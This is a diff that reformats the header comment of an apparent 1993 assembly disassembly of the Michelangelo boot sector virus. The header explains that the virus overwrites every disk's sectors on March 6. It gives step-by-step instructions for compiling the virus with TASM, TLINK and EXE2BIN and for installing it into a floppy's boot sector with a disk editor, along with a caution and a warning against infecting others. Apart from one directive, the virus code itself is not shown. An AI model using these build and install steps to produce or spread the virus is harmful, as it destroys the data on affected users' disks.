@@ -1,25 +1,35 @@
 COMMENT ~===============================================================
 =
-=                   Michelangelo Boot Sector Virus                           =                   ------------------------------                           =         Disassembly (c)1993 Karsten Johansson, PC Scavenger               =
+=                   Michelangelo Boot Sector Virus                           
+=                   ------------------------------                           
+=         Disassembly (c)1993 Karsten Johansson, PC Scavenger               
 =
 =========================================================================
 =  CAUTION:  This virus contains damaging code!!  Do NOT experiment with
 =            it unless you have PC Scavenger installed properly on your 
 =            system, or have a clean boot disk with FDISK handy.
 =
-=  NOTES:    The Michelangelo is a Stoned varient virus.  Instead of         =            printing a harmless message to your screen on every 7 
+=  NOTES:    The Michelangelo is a Stoned varient virus.  Instead of         
+=            printing a harmless message to your screen on every 7 
 =            boots, the Michelangelo waits until March 6th, on which day 
 =            it will proceed to overwrite the sectors on all disks in 
 =            the computer.  The disks are unrecoverable, and need to be 
-=            reformatted if this happens.                                                        =
-=            DO NOT INFECT ANYONE'S SYSTEM BUT YOUR OWN!  To do so is a      =            federal offence.                                                =
+=            reformatted if this happens.                                                        
 =
-=  COMPILE:  With TASM:           TASM    MICH                               =                                 TLINK   MICH                               =                                 EXE2BIN MICH                               =
+=            DO NOT INFECT ANYONE'S SYSTEM BUT YOUR OWN!  To do so is a      
+=            federal offence.                                                
+=
+=
+=  COMPILE:  With TASM:           TASM    MICH                               
+=                                 TLINK   MICH                               
+=                                 EXE2BIN MICH                               
+=
 =  INSTALL:  Use a disk editor such as DISKEDIT from Norton Utilities.  
 =            With a formatted floppy diskette (with system files), copy 
 =            the boot sector to Side 1, Sector 3, then copy the virus 
 =            code to the original boot sector.  To install the virus in 
-=            memory, reboot the system with the newly infected diskette.                    =
+=            memory, reboot the system with the newly infected diskette.                    
+=
 =======================================================================~
 
                .radix   16
